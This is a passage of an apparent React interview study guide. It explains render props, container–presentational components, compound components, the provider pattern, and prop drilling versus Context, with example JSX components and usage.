  return children(matches);
}

// Usage
<MediaQuery query="(max-width: 768px)">
  {(isMobile) => (
    isMobile ? <MobileNav /> : <DesktopNav />
  )}
</MediaQuery>

Example 4: Form validation

function Validator({ value, rules, children }) {
  const [errors, setErrors] = useState([]);
  
  useEffect(() => {
    const newErrors = [];
    
    rules.forEach(rule => {
      if (!rule.test(value)) {
        newErrors.push(rule.message);
      }
    });
    
    setErrors(newErrors);
  }, [value, rules]);
  
  const isValid = errors.length === 0;
  
  return children({ errors, isValid });
}

// Usage
<Validator
  value={email}
  rules={[
    { test: (v) => v.length > 0, message: 'Required' },
    { test: (v) => v.includes('@'), message: 'Invalid email' }
  ]}
>
  {({ errors, isValid }) => (
    <div>
      <input
        value={email}
        onChange={e => setEmail(e.target.value)}
        className={isValid ? 'valid' : 'invalid'}
      />
      {errors.map((error, i) => (
        <div key={i} className="error">{error}</div>
      ))}
    </div>
  )}
</Validator>

Example 5: Intersection observer

function InView({ children, threshold = 0.5 }) {
  const [inView, setInView] = useState(false);
  const ref = useRef();
  
  useEffect(() => {
    const observer = new IntersectionObserver(
      ([entry]) => setInView(entry.isIntersecting),
      { threshold }
    );
    
    if (ref.current) {
      observer.observe(ref.current);
    }
    
    return () => observer.disconnect();
  }, [threshold]);
  
  return children({ inView, ref });
}

// Usage
<InView>
  {({ inView, ref }) => (
    <div ref={ref}>
      {inView ? (
        <ExpensiveComponent />
      ) : (
        <Placeholder />
      )}
    </div>
  )}
</InView>

Prop naming (render, children, or custom):
-------------------------------------------

// 1. "render" prop (explicit)
<Mouse render={mouse => <div>{mouse.x}, {mouse.y}</div>} />

// 2. "children" prop (common)
<Mouse>
  {mouse => <div>{mouse.x}, {mouse.y}</div>}
</Mouse>

// 3. Custom name (semantic)
<DataFetcher renderData={data => <List items={data} />} />

// 4. Multiple render props
<Tabs
  renderHeader={({ tabs, activeTab }) => <TabBar tabs={tabs} active={activeTab} />}
  renderContent={({ content }) => <TabPanel>{content}</TabPanel>}
/>

Performance optimization:
-------------------------

// ❌ Bad: Creates new function on every render
<Mouse render={position => <div>{position.x}</div>} />

// ✅ Good: Use useCallback to memoize
const renderMouse = useCallback(
  position => <div>{position.x}</div>,
  []
);

<Mouse render={renderMouse} />

// Or extract to component
function MouseDisplay({ x, y }) {
  return <div>{x}, {y}</div>;
}

<Mouse render={position => <MouseDisplay {...position} />} />

Render props vs HOCs:
---------------------

// HOC approach
const MouseTracker = withMouse(Component);

// Render prop approach
<Mouse render={mouse => <Component mouse={mouse} />} />

Render props advantages:
✅ More flexible (different rendering for same logic)
✅ Composition is clearer
✅ No prop name collisions
✅ Can see data flow in JSX

HOC advantages:
✅ Less nesting in JSX
✅ Can enhance components declaratively

Render props vs Hooks:
----------------------

// Render props (older pattern)
<Toggle>
  {({ on, toggle }) => (
    <button onClick={toggle}>{on ? 'ON' : 'OFF'}</button>
  )}
</Toggle>

// Custom hook (modern pattern)
function useToggle(initial = false) {
  const [on, setOn] = useState(initial);
  const toggle = () => setOn(prev => !prev);
  return { on, toggle };
}

// Usage
function MyComponent() {
  const { on, toggle } = useToggle();
  return <button onClick={toggle}>{on ? 'ON' : 'OFF'}</button>;
}

Hooks advantages:
✅ No nesting
✅ Cleaner JSX
✅ Easier to compose
✅ Better tree in DevTools

When to still use render props:
- Need dynamic rendering based on state
- Want to share UI logic but keep rendering flexible
- Working with components (hooks only work in components)

Combining patterns:
-------------------

// Component uses hook internally, exposes render prop for flexibility
function DataLoader({ url, children }) {
  const { data, loading, error } = useFetch(url); // Hook
  
  return children({ data, loading, error }); // Render prop
}

Common mistakes:
----------------

1. Forgetting to call the render function:

// ❌ Bad
<Mouse render={position => <div>{position.x}</div>} />

function Mouse({ render }) {
  const position = useMousePosition();
  return render; // Missing () - renders function instead of calling it
}

// ✅ Good
return render(position);

2. Not handling undefined/null:

// ❌ Bad: Crashes if no render prop
function Mouse({ render }) {
  const position = useMousePosition();
  return render(position);
}

// ✅ Good: Handle missing render prop
function Mouse({ render, children }) {
  const position = useMousePosition();
  const renderFn = render || children;
  
  if (!renderFn) {
    return null;
  }
  
  return renderFn(position);
}

3. Creating functions in render (performance):

// ❌ Bad: New function every render
<Mouse render={position => <div>{position.x}</div>} />

// ✅ Better: Extract or memoize
const RenderMouse = React.memo(({ x, y }) => <div>{x}, {y}</div>);
<Mouse render={position => <RenderMouse {...position} />} />

Summary:

Render props:
- Pass function as prop to share logic
- Function receives data and returns elements
- Flexible rendering for same logic
- Common patterns: children as function, render prop
- Modern alternative: custom hooks (preferred)
- Still useful for dynamic rendering needs
- More flexible than HOCs, less nesting than hooks
*/


/**
39. What is the container–presentational component pattern?
----------------------------------------------------------

The container–presentational pattern separates components into two types:
- Containers (smart/stateful): Handle logic, state, and data
- Presentational (dumb/stateless): Handle how things look

This pattern promotes separation of concerns and reusability.

Presentational Components:
--------------------------

Characteristics:
- Concerned with how things look
- Receive data and callbacks via props
- Rarely have own state (only UI state)
- Written as function components
- Reusable and testable

Example presentational component:

function UserCard({ user, onEdit, onDelete }) {
  return (
    <div className="user-card">
      <img src={user.avatar} alt={user.name} />
      <h3>{user.name}</h3>
      <p>{user.email}</p>
      <p className="role">{user.role}</p>
      
      <div className="actions">
        <button onClick={() => onEdit(user)}>Edit</button>
        <button onClick={() => onDelete(user.id)} className="danger">
          Delete
        </button>
      </div>
    </div>
  );
}

// Presentational - pure display logic
function UserList({ users, onEdit, onDelete }) {
  if (users.length === 0) {
    return <div className="empty">No users found</div>;
  }
  
  return (
    <div className="user-list">
      {users.map(user => (
        <UserCard
          key={user.id}
          user={user}
          onEdit={onEdit}
          onDelete={onDelete}
        />
      ))}
    </div>
  );
}

Container Components:
---------------------

Characteristics:
- Concerned with how things work
- Provide data and behavior to presentational components
- Often stateful (useState, useReducer, etc.)
- Call APIs, manage side effects
- Rarely have DOM markup (mostly logic)

Example container component:

function UserListContainer() {
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  
  // Data fetching
  useEffect(() => {
    fetch('/api/users')
      .then(res => res.json())
      .then(data => {
        setUsers(data);
        setLoading(false);
      })
      .catch(err => {
        setError(err);
        setLoading(false);
      });
  }, []);
  
  // Business logic
  const handleEdit = (user) => {
    // Navigate to edit page or open modal
    navigate(`/users/${user.id}/edit`);
  };
  
  const handleDelete = async (userId) => {
    if (!confirm('Are you sure?')) return;
    
    await fetch(`/api/users/${userId}`, { method: 'DELETE' });
    setUsers(users.filter(u => u.id !== userId));
  };
  
  // Render states
  if (loading) return <LoadingSpinner />;
  if (error) return <ErrorMessage error={error} />;
  
  // Pass data and handlers to presentational component
  return (
    <UserList
      users={users}
      onEdit={handleEdit}
      onDelete={handleDelete}
    />
  );
}

Full example:
-------------

// ========== Presentational Components ==========

// Button (presentational)
function Button({ variant = 'primary', onClick, children, disabled }) {
  return (
    <button
      className={`btn btn-${variant}`}
      onClick={onClick}
      disabled={disabled}
    >
      {children}
    </button>
  );
}

// SearchBar (presentational)
function SearchBar({ value, onChange, onClear, placeholder }) {
  return (
    <div className="search-bar">
      <input
        type="text"
        value={value}
        onChange={e => onChange(e.target.value)}
        placeholder={placeholder}
      />
      {value && (
        <button onClick={onClear} className="clear-btn">×</button>
      )}
    </div>
  );
}

// ProductCard (presentational)
function ProductCard({ product, onAddToCart, onViewDetails }) {
  return (
    <div className="product-card">
      <img src={product.image} alt={product.name} />
      <h3>{product.name}</h3>
      <p className="price">${product.price}</p>
      <p className="description">{product.description}</p>
      
      <div className="actions">
        <Button onClick={() => onViewDetails(product.id)}>
          Details
        </Button>
        <Button
          variant="success"
          onClick={() => onAddToCart(product)}
          disabled={product.stock === 0}
        >
          {product.stock > 0 ? 'Add to Cart' : 'Out of Stock'}
        </Button>
      </div>
    </div>
  );
}

// ProductList (presentational)
function ProductList({ products, onAddToCart, onViewDetails }) {
  return (
    <div className="product-grid">
      {products.map(product => (
        <ProductCard
          key={product.id}
          product={product}
          onAddToCart={onAddToCart}
          onViewDetails={onViewDetails}
        />
      ))}
    </div>
  );
}

// ========== Container Component ==========

function ProductListContainer() {
  const [products, setProducts] = useState([]);
  const [filteredProducts, setFilteredProducts] = useState([]);
  const [searchQuery, setSearchQuery] = useState('');
  const [loading, setLoading] = useState(true);
  
  // Fetch data
  useEffect(() => {
    fetch('/api/products')
      .then(res => res.json())
      .then(data => {
        setProducts(data);
        setFilteredProducts(data);
        setLoading(false);
      });
  }, []);
  
  // Business logic: Search
  useEffect(() => {
    if (!searchQuery) {
      setFilteredProducts(products);
    } else {
      const filtered = products.filter(p =>
        p.name.toLowerCase().includes(searchQuery.toLowerCase())
      );
      setFilteredProducts(filtered);
    }
  }, [searchQuery, products]);
  
  // Business logic: Add to cart
  const handleAddToCart = (product) => {
    // Call cart API
    fetch('/api/cart', {
      method: 'POST',
      body: JSON.stringify({ productId: product.id })
    }).then(() => {
      showNotification(`Added ${product.name} to cart`);
    });
  };
  
  // Business logic: View details
  const handleViewDetails = (productId) => {
    navigate(`/products/${productId}`);
  };
  
  // Business logic: Clear search
  const handleClearSearch = () => {
    setSearchQuery('');
  };
  
  if (loading) return <LoadingSpinner />;
  
  return (
    <div className="product-page">
      <SearchBar
        value={searchQuery}
        onChange={setSearchQuery}
        onClear={handleClearSearch}
        placeholder="Search products..."
      />
      
      <ProductList
        products={filteredProducts}
        onAddToCart={handleAddToCart}
        onViewDetails={handleViewDetails}
      />
    </div>
  );
}

Benefits of this pattern:
-------------------------

1. Reusability:
   Presentational components can be reused in different contexts

// Same UserCard used in different containers
<UserCard user={user} onEdit={handleEdit} onDelete={handleDelete} />
<UserCard user={user} onEdit={openModal} onDelete={showConfirm} />

2. Testability:
   Presentational components easy to test (just props)

test('UserCard renders user info', () => {
  const user = { name: 'Alice', email: 'alice@example.com' };
  render(<UserCard user={user} onEdit={jest.fn()} onDelete={jest.fn()} />);
  
  expect(screen.getByText('Alice')).toBeInTheDocument();
  expect(screen.getByText('alice@example.com')).toBeInTheDocument();
});

3. Separation of concerns:
   UI logic separate from business logic

4. Better collaboration:
   Designers work on presentational, developers on containers

Modern approach with hooks:
---------------------------

The pattern has evolved with hooks. Now we use custom hooks for logic instead of 
container components.

// Old pattern: Container component
function UserListContainer() {
  const [users, setUsers] = useState([]);
  // ... fetch logic, handlers, etc.
  
  return <UserList users={users} onEdit={handleEdit} />;
}

// Modern pattern: Custom hook + presentational component
function useUsers() {
  const [users, setUsers] = useState([]);
  
  useEffect(() => {
    fetch('/api/users')
      .then(res => res.json())
      .then(setUsers);
  }, []);
  
  const deleteUser = (id) => {
    // delete logic
  };
  
  return { users, deleteUser };
}

function UserListPage() {
  const { users, deleteUser } = useUsers(); // Hook provides logic
  
  return <UserList users={users} onDelete={deleteUser} />; // Presentational component
}

Comparison:
-----------

Old pattern (container component):

UserListContainer (container)
  └── UserList (presentational)
        └── UserCard (presentational)

Modern pattern (hook + component):

UserListPage (uses custom hook)
  ├── useUsers() (custom hook - logic)
  └── UserList (presentational)
        └── UserCard (presentational)

Both achieve separation, but hooks are more flexible and composable.

When to use presentational components:
---------------------------------------

✅ Reusable UI components (buttons, cards, modals)
✅ Design system components
✅ Pure display logic
✅ Components that will be tested extensively
✅ Shareable across projects

When presentational components can have state:
----------------------------------------------

Presentational components CAN have local UI state that doesn't affect business logic:

function Accordion({ title, children }) {
  const [isOpen, setIsOpen] = useState(false); // UI state OK
  
  return (
    <div>
      <button onClick={() => setIsOpen(!isOpen)}>
        {title}
      </button>
      {isOpen && <div>{children}</div>}
    </div>
  );
}

Summary:

Container–Presentational pattern:
- Separates logic (containers) from UI (presentational)
- Presentational: props in, UI out, reusable, testable
- Containers: fetch data, handle events, manage state
- Modern approach: custom hooks for logic + presentational components
- Promotes reusability, testability, and separation of concerns
- Core pattern for building maintainable React apps
*/


/**
40. What is the compound component pattern?
-------------------------------------------

Compound components are components that work together to form a complete UI, sharing 
implicit state without passing props through every level. They provide a flexible and 
expressive API.

Think of HTML elements like <select> and <option>:

<select>
  <option value="1">One</option>
  <option value="2">Two</option>
</select>

Option knows about Select's state without explicit props. Compound components work similarly.

Basic example:
--------------

Without compound components (explicit props):

function Tabs({ defaultTab }) {
  const [activeTab, setActiveTab] = useState(defaultTab);
  
  return (
    <div>
      <TabList activeTab={activeTab} onTabChange={setActiveTab}>
        <Tab id="home" label="Home" />
        <Tab id="profile" label="Profile" />
      </TabList>
      
      <TabPanels activeTab={activeTab}>
        <TabPanel id="home">Home content</TabPanel>
        <TabPanel id="profile">Profile content</TabPanel>
      </TabPanels>
    </div>
  );
}

With compound components (implicit state sharing):

// Usage (clean API)
<Tabs defaultTab="home">
  <Tabs.List>
    <Tabs.Tab id="home">Home</Tabs.Tab>
    <Tabs.Tab id="profile">Profile</Tabs.Tab>
  </Tabs.List>
  
  <Tabs.Panels>
    <Tabs.Panel id="home">Home content</Tabs.Panel>
    <Tabs.Panel id="profile">Profile content</Tabs.Panel>
  </Tabs.Panels>
</Tabs>

Implementation with Context:
----------------------------

// 1. Create context
const TabsContext = createContext();

// 2. Parent component provides state
function Tabs({ defaultTab, children }) {
  const [activeTab, setActiveTab] = useState(defaultTab);
  
  const value = {
    activeTab,
    setActiveTab
  };
  
  return (
    <TabsContext.Provider value={value}>
      <div className="tabs">{children}</div>
    </TabsContext.Provider>
  );
}

// 3. Child components consume context
function TabList({ children }) {
  return <div className="tab-list">{children}</div>;
}

function Tab({ id, children }) {
  const { activeTab, setActiveTab } = useContext(TabsContext);
  const isActive = activeTab === id;
  
  return (
    <button
      className={isActive ? 'tab active' : 'tab'}
      onClick={() => setActiveTab(id)}
    >
      {children}
    </button>
  );
}

function TabPanels({ children }) {
  return <div className="tab-panels">{children}</div>;
}

function TabPanel({ id, children }) {
  const { activeTab } = useContext(TabsContext);
  
  if (activeTab !== id) return null;
  
  return <div className="tab-panel">{children}</div>;
}

// 4. Attach as properties (compound pattern)
Tabs.List = TabList;
Tabs.Tab = Tab;
Tabs.Panels = TabPanels;
Tabs.Panel = TabPanel;

// Now can use: <Tabs><Tabs.Tab /></Tabs>

Real-world example: Modal compound component
---------------------------------------------

const ModalContext = createContext();

function Modal({ isOpen, onClose, children }) {
  return (
    <ModalContext.Provider value={{ isOpen, onClose }}>
      {isOpen && (
        <div className="modal-backdrop" onClick={onClose}>
          {children}
        </div>
      )}
    </ModalContext.Provider>
  );
}

function ModalContent({ children }) {
  return (
    <div className="modal-content" onClick={e => e.stopPropagation()}>
      {children}
    </div>
  );
}

function ModalHeader({ children }) {
  const { onClose } = useContext(ModalContext);
  
  return (
    <div className="modal-header">
      {children}
      <button onClick={onClose} className="close">×</button>
    </div>
  );
}

function ModalBody({ children }) {
  return <div className="modal-body">{children}</div>;
}

function ModalFooter({ children }) {
  return <div className="modal-footer">{children}</div>;
}

// Attach compound components
Modal.Content = ModalContent;
Modal.Header = ModalHeader;
Modal.Body = ModalBody;
Modal.Footer = ModalFooter;

// Usage
function App() {
  const [isOpen, setIsOpen] = useState(false);
  
  return (
    <>
      <button onClick={() => setIsOpen(true)}>Open Modal</button>
      
      <Modal isOpen={isOpen} onClose={() => setIsOpen(false)}>
        <Modal.Content>
          <Modal.Header>
            <h2>Modal Title</h2>
          </Modal.Header>
          
          <Modal.Body>
            <p>Modal content goes here</p>
          </Modal.Body>
          
          <Modal.Footer>
            <button onClick={() => setIsOpen(false)}>Cancel</button>
            <button onClick={handleSave}>Save</button>
          </Modal.Footer>
        </Modal.Content>
      </Modal>
    </>
  );
}

Example: Accordion compound component
--------------------------------------

const AccordionContext = createContext();

function Accordion({ children, allowMultiple = false }) {
  const [openItems, setOpenItems] = useState([]);
  
  const toggle = (id) => {
    if (allowMultiple) {
      setOpenItems(prev =>
        prev.includes(id)
          ? prev.filter(item => item !== id)
          : [...prev, id]
      );
    } else {
      setOpenItems(prev => prev.includes(id) ? [] : [id]);
    }
  };
  
  return (
    <AccordionContext.Provider value={{ openItems, toggle }}>
      <div className="accordion">{children}</div>
    </AccordionContext.Provider>
  );
}

function AccordionItem({ id, children }) {
  return (
    <div className="accordion-item">
      {children}
    </div>
  );
}

function AccordionHeader({ id, children }) {
  const { openItems, toggle } = useContext(AccordionContext);
  const isOpen = openItems.includes(id);
  
  return (
    <button
      className="accordion-header"
      onClick={() => toggle(id)}
    >
      {children}
      <span>{isOpen ? '−' : '+'}</span>
    </button>
  );
}

function AccordionPanel({ id, children }) {
  const { openItems } = useContext(AccordionContext);
  const isOpen = openItems.includes(id);
  
  if (!isOpen) return null;
  
  return <div className="accordion-panel">{children}</div>;
}

Accordion.Item = AccordionItem;
Accordion.Header = AccordionHeader;
Accordion.Panel = AccordionPanel;

// Usage
<Accordion>
  <Accordion.Item id="1">
    <Accordion.Header id="1">Section 1</Accordion.Header>
    <Accordion.Panel id="1">Content 1</Accordion.Panel>
  </Accordion.Item>
  
  <Accordion.Item id="2">
    <Accordion.Header id="2">Section 2</Accordion.Header>
    <Accordion.Panel id="2">Content 2</Accordion.Panel>
  </Accordion.Item>
</Accordion>

Flexible composition example:
-----------------------------

// Can rearrange components
<Modal isOpen={isOpen} onClose={onClose}>
  <Modal.Content>
    <Modal.Body>
      <p>No header needed!</p>
    </Modal.Body>
    <Modal.Footer>
      <button>OK</button>
    </Modal.Footer>
  </Modal.Content>
</Modal>

// Can add custom components between
<Tabs defaultTab="home">
  <div className="custom-wrapper">
    <Tabs.List>
      <Tabs.Tab id="home">Home</Tabs.Tab>
    </Tabs.List>
  </div>
  
  <Tabs.Panels>
    <Tabs.Panel id="home">Content</Tabs.Panel>
  </Tabs.Panels>
</Tabs>

Benefits:
---------

1. Flexible API:
   Users compose components how they want

2. Implicit state sharing:
   No prop drilling

3. Readable JSX:
   Semantic, self-documenting

4. Separation of concerns:
   Each compound component has one job

5. Customizable:
   Can rearrange, skip, or extend parts

When to use compound components:
---------------------------------

✅ Related components that share state (tabs, accordions, menus)
✅ Building reusable component libraries
✅ When you want flexible, composable APIs
✅ Components with multiple moving parts that need coordination

When NOT to use:
-----------------

❌ Simple components without shared state
❌ When order/structure must be enforced
❌ Overly complex state management (use forms library instead)

Summary:

Compound components:
- Work together to form complete UI
- Share state implicitly via Context
- Flexible, composable API
- Common for tabs, modals, menus, accordions
- Attach child components as properties
- Balance flexibility with guidance
*/


/**
41. What is the provider pattern?
---------------------------------

The provider pattern uses React Context to make data available to a component tree 
without passing props through every level. A "provider" component wraps the tree and 
supplies values that descendant components can "consume."

Basic pattern:
--------------

// 1. Create context
const ThemeContext = createContext();

// 2. Create provider component
function ThemeProvider({ children }) {
  const [theme, setTheme] = useState('light');
  
  const toggleTheme = () => {
    setTheme(prev => prev === 'light' ? 'dark' : 'light');
  };
  
  const value = {
    theme,
    setTheme,
    toggleTheme
  };
  
  return (
    <ThemeContext.Provider value={value}>
      {children}
    </ThemeContext.Provider>
  );
}

// 3. Create custom hook for consuming
function useTheme() {
  const context = useContext(ThemeContext);
  
  if (!context) {
    throw new Error('useTheme must be used within ThemeProvider');
  }
  
  return context;
}

// 4. Usage
function App() {
  return (
    <ThemeProvider>
      <Header />
      <Content />
      <Footer />
    </ThemeProvider>
  );
}

function Header() {
  const { theme, toggleTheme } = useTheme();
  
  return (
    <header className={theme}>
      <button onClick={toggleTheme}>
        Switch to {theme === 'light' ? 'dark' : 'light'}
      </button>
    </header>
  );
}

Real-world example: Authentication provider
--------------------------------------------

const AuthContext = createContext();

function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    // Check authentication on mount
    checkAuth()
      .then(user => setUser(user))
      .catch(() => setUser(null))
      .finally(() => setLoading(false));
  }, []);
  
  const login = async (credentials) => {
    const user = await loginAPI(credentials);
    setUser(user);
    localStorage.setItem('token', user.token);
  };
  
  const logout = () => {
    logoutAPI();
    setUser(null);
    localStorage.removeItem('token');
  };
  
  const value = {
    user,
    loading,
    isAuthenticated: !!user,
    login,
    logout
  };
  
  return (
    <AuthContext.Provider value={value}>
      {children}
    </AuthContext.Provider>
  );
}

function useAuth() {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within AuthProvider');
  }
  return context;
}

// Usage across app
function App() {
  return (
    <AuthProvider>
      <Router>
        <Routes />
      </Router>
    </AuthProvider>
  );
}

function Profile() {
  const { user, logout } = useAuth();
  
  return (
    <div>
      <h1>Welcome, {user.name}</h1>
      <button onClick={logout}>Logout</button>
    </div>
  );
}

function ProtectedRoute({ children }) {
  const { isAuthenticated, loading } = useAuth();
  
  if (loading) return <LoadingSpinner />;
  if (!isAuthenticated) return <Navigate to="/login" />;
  
  return children;
}

Multiple providers example:
---------------------------

function App() {
  return (
    <AuthProvider>
      <ThemeProvider>
        <LanguageProvider>
          <NotificationProvider>
            <Router>
              <Routes />
            </Router>
          </NotificationProvider>
        </LanguageProvider>
      </ThemeProvider>
    </AuthProvider>
  );
}

// Or compose them
function AppProviders({ children }) {
  return (
    <AuthProvider>
      <ThemeProvider>
        <LanguageProvider>
          <NotificationProvider>
            {children}
          </NotificationProvider>
        </LanguageProvider>
      </ThemeProvider>
    </AuthProvider>
  );
}

function App() {
  return (
    <AppProviders>
      <Router>
        <Routes />
      </Router>
    </AppProviders>
  );
}

Provider with reducer example:
------------------------------

const CartContext = createContext();

function cartReducer(state, action) {
  switch (action.type) {
    case 'ADD_ITEM':
      return {
        ...state,
        items: [...state.items, action.item]
      };
    case 'REMOVE_ITEM':
      return {
        ...state,
        items: state.items.filter(item => item.id !== action.id)
      };
    case 'CLEAR_CART':
      return { items: [] };
    default:
      return state;
  }
}

function CartProvider({ children }) {
  const [state, dispatch] = useReducer(cartReducer, { items: [] });
  
  const addItem = (item) => dispatch({ type: 'ADD_ITEM', item });
  const removeItem = (id) => dispatch({ type: 'REMOVE_ITEM', id });
  const clearCart = () => dispatch({ type: 'CLEAR_CART' });
  
  const total = state.items.reduce((sum, item) => sum + item.price, 0);
  
  const value = {
    items: state.items,
    addItem,
    removeItem,
    clearCart,
    total
  };
  
  return (
    <CartContext.Provider value={value}>
      {children}
    </CartContext.Provider>
  );
}

Optimized provider (prevent unnecessary re-renders):
-----------------------------------------------------

function OptimizedProvider({ children }) {
  const [state, setState] = useState(initialState);
  
  // Memoize value to prevent new object on every render
  const value = useMemo(() => ({
    state,
    setState,
    // ... other values/functions
  }), [state]); // Only recreate when state changes
  
  return (
    <MyContext.Provider value={value}>
      {children}
    </MyContext.Provider>
  );
}

Split context for performance:
-------------------------------

// Instead of one large context
const AppContext = createContext();

// Split into separate contexts
const UserContext = createContext();
const ThemeContext = createContext();
const SettingsContext = createContext();

// Components only re-render when their specific context changes
function UserProfile() {
  const user = useContext(UserContext); // Only re-renders on user change
  return <div>{user.name}</div>;
}

function ThemedButton() {
  const theme = useContext(ThemeContext); // Only re-renders on theme change
  return <button className={theme}>Click</button>;
}

Best practices:
---------------

1. Always provide custom hook:

function useMyContext() {
  const context = useContext(MyContext);
  if (!context) {
    throw new Error('useMyContext must be used within MyProvider');
  }
  return context;
}

2. Memoize provider value:

const value = useMemo(() => ({ state, actions }), [state]);

3. Split large contexts:

// Bad: One huge context
<AppContext.Provider value={{ user, theme, cart, settings }} />

// Good: Separate contexts
<UserProvider>
  <ThemeProvider>
    <CartProvider>
      <SettingsProvider />
    </CartProvider>
  </ThemeProvider>
</UserProvider>

4. Co-locate provider with related code:

// features/auth/AuthProvider.js
export { AuthProvider, useAuth };

// features/cart/CartProvider.js
export { CartProvider, useCart };

Summary:

Provider pattern:
- Wraps component tree to provide data/functionality
- Uses React Context under the hood
- Avoids prop drilling
- Common for auth, theme, language, cart
- Create provider component + custom hook
- Optimize with useMemo
- Split contexts for performance
- Essential pattern for app-wide state
*/


/**
42. What is the difference between props drilling and context usage?
-------------------------------------------------------------------

Prop drilling and Context are two different ways to pass data through a React component tree.

Prop drilling:
--------------

Definition:
- Passing data from a top-level component down through multiple intermediate components
  via props, even if those middle components don't use the data themselves.

Example:

function App() {
  const [user, setUser] = useState({ name: 'Alice', role: 'admin' });

  // Must pass user down through Page
  return <Page user={user} setUser={setUser} />;
}

function Page({ user, setUser }) {
  // Must pass user further down
  return <Layout user={user} setUser={setUser} />;
}

function Layout({ user, setUser }) {
  // Must pass user further down
  return <Sidebar user={user} setUser={setUser} />;
}

function Sidebar({ user, setUser }) {
  // Finally used here
  return <UserProfile user={user} setUser={setUser} />;
}

function UserProfile({ user, setUser }) {
  return (
    <div>
      <p>{user.name}</p>
      <button onClick={() => setUser({ ...user, name: 'Bob' })}>
        Change Name
      </button>
    </div>
  );
}

Characteristics of prop drilling:
- Data flow is explicit (you can see who gets what via props).
- Intermediate components become “pipelines” for data they don’t care about.
- Refactoring the tree (inserting/removing levels) can require updating many components.
- For shallow trees (1–2 levels) it’s simple and often preferable.

Pros:
- Very explicit and easy to trace.
- No extra abstractions.
- Fine-grained control over what re-renders (only components that receive changed props).

Cons:
- Noisy and repetitive when data has to cross many levels.
- Makes intermediate components more coupled to higher-level data.
- Harder to maintain as the tree grows deeper.

Context usage:
--------------

Definition:
- A way to make data available to any component in a subtree without passing it explicitly
  via props through every intermediate level.

Core pieces:
- A context object created with `createContext`.
- A provider component that supplies a value.
- Consumers that read the value via `useContext` (or `<Context.Consumer>`).

Example using Context:

// 1. Create context
const UserContext = createContext(null);

// 2. Provider wraps tree
function UserProvider({ children }) {
  const [user, setUser] = useState({ name: 'Alice', role: 'admin' });

  const value = { user, setUser };

  return (
    <UserContext.Provider value={value}>
      {children}
    </UserContext.Provider>
  );
}

// 3. App uses provider at a high level
function App() {
  return (
    <UserProvider>
      <Page />
    </UserProvider>
  );
}

// 4. Intermediate components no longer need user props
function Page() {
  return <Layout />;
}

function Layout() {
  return <Sidebar />;
}

function Sidebar() {
  return <UserProfile />;
}

// 5. Deep component consumes context directly
function UserProfile() {
  const { user, setUser } = useContext(UserContext);

  return (
    <div>
      <p>{user.name}</p>
      <button onClick={() => setUser({ ...user, name: 'Bob' })}>
        Change Name
      </button>
    </div>
  );
}

Characteristics of Context:
- Data is “global” to a subtree; any descendant can read it without being passed props.
- Removes the need for intermediate components to forward props.
- Improves ergonomics for deeply nested or widely used state (auth, theme, language, etc.).

Pros:
- Eliminates prop drilling for shared state.
- Easier to add/remove intermediate components without changing props.
- Good for truly shared / app-wide concerns.

Cons:
- Data flow is more implicit (harder to see exactly where values come from by reading JSX).
- All consumers re-render when the provided value changes (if not optimized).
- Slightly more setup (context, provider, and usually a custom hook).

Direct comparison:
------------------

Conceptual difference:

- Prop drilling:
  - Data flows explicitly: parent → child → grandchild → ...
  - Every level receives props, even if it doesn’t use them.
  - Good for local, shallow sharing.

- Context:
  - Data flows implicitly: provider → any descendant that calls `useContext`.
  - Intermediate components stay unaware of that data.
  - Good for global or widely shared state across deep trees.

Example: 4-level tree:

// Prop drilling
<App user={user}>
  <Page user={user}>
    <Layout user={user}>
      <Sidebar user={user}>
        <UserProfile user={user} />
      </Sidebar>
    </Layout>
  </Page>
</App>

// Context
<UserProvider>
  <App>
    <Page>
      <Layout>
        <Sidebar>
          <UserProfile /> // pulls from context directly
        </Sidebar>
      </Layout>
    </Page>
  </App>
</UserProvider>

When to use prop drilling:
--------------------------

Use prop drilling when:
- Data is needed only a few levels down (e.g., parent → child → grandchild).
- The intermediate components also logically care about that data.
- You prefer maximum explicitness.
- The tree is small or local to a feature.

Example (prop drilling makes sense):

function ProductPage() {
  const [product, setProduct] = useState(...);

  return (
    <ProductLayout product={product}>
      <ProductHeader product={product} />
      <ProductDetails product={product} />
      <ProductFooter product={product} />
    </ProductLayout>
  );
}

Here, all components care about product, so passing via props is straightforward.

When to use Context:
--------------------

Use Context when:
- The same data is needed by many components at different levels.
- You’d otherwise pass props through many layers that don’t use them.
- You’re dealing with “global-ish” concerns:
  - Auth user
  - Theme (light/dark)
  - Locale / translations
  - Feature flags
  - Global app settings
- You want to avoid rigid prop chains across the app.

Example concerns ideal for Context:
- `AuthProvider` for user and permissions.
- `ThemeProvider` for colors, typography, UI mode.
- `CartProvider` for shopping cart state in e-commerce.
- `SettingsProvider` for preferences like language and layout.

Performance considerations:
---------------------------

Prop drilling:
- Only components that receive updated props re-render.
- You control exactly which components get which data.
- Can be more efficient when state is local and tree is small.

Context:
- Every component that consumes the context re-renders when the value changes.
- If a provider’s value is an object recreated on every render, it can trigger extra renders.
- Good practice: memoize provider values and split contexts when necessary.

Example optimization:

const UserContext = createContext();

function UserProvider({ children }) {
  const [user, setUser] = useState(null);

  const value = useMemo(() => ({ user, setUser }), [user]);

  return (
    <UserContext.Provider value={value}>
      {children}
    </UserContext.Provider>
  );
}

Hybrid pattern (both together):
-------------------------------

A common real-world pattern:
- Use Context for app-wide or cross-cutting concerns.
- Use prop drilling for local, feature-specific data.

Example:

// App-level “global” state with Context
<AuthProvider>
  <ThemeProvider>
    <App />
  </ThemeProvider>
</AuthProvider>

// Local state via props for a small feature
function TodoSection() {
  const [todos, setTodos] = useState([]);
  return (
    <TodoList
      todos={todos}
      onToggle={id => { ... }}
      onDelete={id => { ... }}
    />
  );
}

Summary:
--------

- Prop drilling:
  - Explicit data passing via props through every level.
  - Great for small, shallow trees and local state.
  - Becomes noisy and brittle for deeply nested/shared state.

- Context usage:
  - Provides data implicitly to any descendant via a provider.
  - Ideal for global or widely shared state across deep trees.
  - Needs careful optimization and good structure for performance and clarity.

Rule of thumb:
--------------
- If only a couple of levels need the data → props.
- If many distant components need the data → Context (provider pattern).
*/



/**
43. What is the Context API and when should you use it?
-------------------------------------------------------

The Context API is a built-in React feature for sharing data across the component tree
without prop drilling. It creates a "global" state for a subtree of components.

Core concepts:
--------------

1. createContext: Creates a context object
2. Provider: Makes data available to descendants
3. Consumer/useContext: Reads data from context

